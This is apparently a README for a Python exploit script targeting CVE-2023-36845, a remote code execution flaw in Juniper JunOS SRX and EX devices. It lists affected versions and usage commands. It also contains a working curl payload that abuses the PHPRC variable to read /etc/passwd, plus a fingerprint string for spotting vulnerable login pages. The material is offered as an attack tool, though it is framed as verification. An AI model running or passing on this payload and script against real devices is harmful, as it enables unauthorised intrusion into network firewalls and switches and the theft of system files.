#CVE-2023-36845 
#RCE in #Juniper #JunOS within #SRX and #EX Series, CVSS: 9.8

       __ __  __ _   __ ____ ____   ______ ____         __ __  __ _   __ ____  _____    ____   ______ ______
      / // / / // | / //  _// __ \ / ____// __ \       / // / / // | / // __ \/ ___/   / __ \ / ____// ____/
 __  / // / / //  |/ / / / / /_/ // __/  / /_/ /  __  / // / / //  |/ // / / /\__ \   / /_/ // /    / __/   
/ /_/ // /_/ // /|  /_/ / / ____// /___ / _, _/  / /_/ // /_/ // /|  // /_/ /___/ /  / _, _// /___ / /___   
\____/ \____//_/ |_//___//_/    /_____//_/ |_|   \____/ \____//_/ |_/ \____//____/  /_/ |_| \____//_____/   

Related CVEs: CVE-2023-36844, CVE-2023-36845, CVE-2023-36846, CVE-2023-36847, and CVE-2023-36851                                             Written by Ferdi GÃ¼l @2023                                              

Usage of ./exploit_CVE-2023-36845.py:
  -h help
  -u Target URL
    	python3 exploit_CVE-2023-36845.py -u http://example.com


Through skillful manipulation of a tailored request to configure the PHPRC variable, an attacker gains the ability to modify the PHP execution environment, facilitating the injection and execution of code.

To verify the vulnerability on your system, you can also use the code snippet below:
$ curl <Target_URL> -F $'auto_prepend_file="/etc/passwd\n"' -F 'PHPRC=/dev/fd/0'

In addition, based on my examinations so far, it is advisable to be particularly cautious with servers containing the character "#js2nr0px1R2" assigned to the variable "document.login.password.value" embedded in the web server script as well. So, in my observations, I have noticed that all instances I have examined with this characteristic are vulnerable for now.

Affected versions:
All versions prior to 20.4R3-S9;
21.1 version 21.1R1 and later versions;
21.2 versions prior to 21.2R3-S7;
21.3 versions prior to 21.3R3-S5;
21.4 versions prior to 21.4R3-S5;
22.1 versions prior to 22.1R3-S4;
22.2 versions prior to 22.2R3-S2;
22.3 versions prior to 22.3R2-S2, 22.3R3-S1;
22.4 versions prior to 22.4R2-S1, 22.4R3;
23.2 versions prior to 23.2R1-S1, 23.2R2.


Install Requirements:

$ pip install -r requirements.txt


Run Exploit Script:

$ python3 exploit_CVE-2023-36846.PY -h
$ python3 exploit_CVE-2023-36845.py -u http://example.com
